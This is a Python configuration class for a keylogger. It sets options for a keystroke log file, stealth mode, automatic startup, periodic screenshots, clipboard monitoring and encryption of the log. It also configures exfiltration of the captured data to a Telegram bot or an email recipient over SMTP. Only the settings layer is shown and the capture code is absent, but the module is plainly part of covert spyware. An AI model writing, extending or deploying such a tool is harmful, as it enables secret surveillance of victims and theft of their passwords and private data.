import os
from dotenv import load_dotenv
import configparser

class Config:
    def __init__(self, config_file=None):
        load_dotenv()  # load from .env

        # General
        self.log_file = os.getenv('LOG_FILE', 'keylog.txt')
        self.encrypt_log = os.getenv('ENCRYPT_LOG', 'False').lower() == 'true'
        self.encryption_password = os.getenv('ENCRYPTION_PASSWORD', 'defaultpassword')
        self.stealth_mode = os.getenv('STEALTH_MODE', 'False').lower() == 'true'
        self.auto_startup = os.getenv('AUTO_STARTUP', 'False').lower() == 'true'
        self.screenshot_interval = int(os.getenv('SCREENSHOT_INTERVAL', '0'))  # 0 = disabled
        self.clipboard_monitor = os.getenv('CLIPBOARD_MONITOR', 'False').lower() == 'true'
        self.flush_interval = int(os.getenv('FLUSH_INTERVAL', '30'))

        # Telegram
        self.telegram_token = os.getenv('TELEGRAM_TOKEN')
        self.telegram_chat_id = os.getenv('TELEGRAM_CHAT_ID')
        self.telegram_enabled = bool(self.telegram_token and self.telegram_chat_id)

        # Email
        self.email_enabled = os.getenv('EMAIL_ENABLED', 'False').lower() == 'true'
        self.smtp_server = os.getenv('SMTP_SERVER', 'smtp.gmail.com')
        self.smtp_port = int(os.getenv('SMTP_PORT', '587'))
        self.email_user = os.getenv('EMAIL_USER')
        self.email_password = os.getenv('EMAIL_PASSWORD')
        self.email_recipient = os.getenv('EMAIL_RECIPIENT')

        # If config file provided, override with ini
        if config_file and os.path.exists(config_file):
            self._load_ini(config_file)

    def _load_ini(self, config_file):
        config = configparser.ConfigParser()
        config.read(config_file)
        # Override attributes if exist
        for section in config.sections():
            for key, value in config.items(section):
                attr_name = f"{section}_{key}".lower()
                if hasattr(self, attr_name):
                    setattr(self, attr_name, value)
                else:
                    # also handle without section prefix
                    if hasattr(self, key):
                        setattr(self, key, value)